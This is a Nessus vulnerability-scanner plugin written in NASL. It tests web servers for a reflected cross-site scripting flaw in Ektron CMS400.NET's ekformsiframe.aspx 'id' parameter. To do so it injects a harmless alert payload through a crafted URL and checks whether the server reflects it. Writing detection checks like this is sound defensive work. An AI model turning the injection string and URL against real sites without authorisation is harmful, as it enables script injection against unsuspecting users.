#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(41607);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(36279);
  script_xref(name:"OSVDB", value:"57667");
  script_xref(name:"Secunia", value:"36591");

  script_name(english:"Ektron CMS400.NET id Parameter XSS");
  script_summary(english:"Attempts to exploit an XSS issue in Ektron CMS 400.NET");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a .NET application that is affected by\n",
      "a cross-site scripting vulnerability.\n"
    )
  );

  script_set_attribute(
    attribute:"description",
    value:string(
      "The remote web server is hosting the Ektron CMS400.NET content \n",
      "management system. The installed version fails to properly sanitize\n",
      "user-supplied input to the 'id' parameter of the 'ekformsiframe.aspx\n",
      "script. An attacker, exploiting this flaw, could execute arbitrary\n",
      "script code in the browser of unsuspecting users.\n",
      "\n",
      "Note that the 'css', 'eca', and 'skin' parameters are also reportedly\n",
      "affected, though Nessus has not checked for these."
    )
  );

  script_set_attribute(
    attribute:"solution",
    value:"Unknown at this time."
  );

  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );

  script_set_attribute(
    attribute:"vuln_publication_date",
    value:"2009/09/04"
  );

  script_set_attribute(
    attribute:"plugin_publication_date",
    value:"2009/09/24"
  );

  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http.inc");
include("misc_func.inc");
include("global_settings.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (get_kb_item("www/"+port+"/generic_xss")) exit(1, "The web server itself is prone to XSS attacks.");

if (thorough_tests) dirs = make_list(list_uniq("/cms", "/cms400", "cms400.net", cgi_dirs()));
else dirs = make_list(cgi_dirs());

exploit = "<script>alert('Nessus')</script>";

#Test for the XSS vulnerability.
foreach dir (dirs)
{
  url = string(
          dir,
          '/WorkArea/ContentDesigner/ekformsiframe.aspx?id=">',
          urlencode(str:exploit)
  );
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(1, "The web server failed to respond.");

  if(
    "Ektron ContentDesigner IFRAME" >< res[2] &&
    string('<body id="">', exploit, '" class=') >< res[2]
  )
  {
    if(report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to exploit this issue using the following URL :\n",
        "\n",
        url,
        "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port:port);
    set_kb_item(name:'www/'+port+'XSS', value:TRUE);
    exit(0);
  }
}
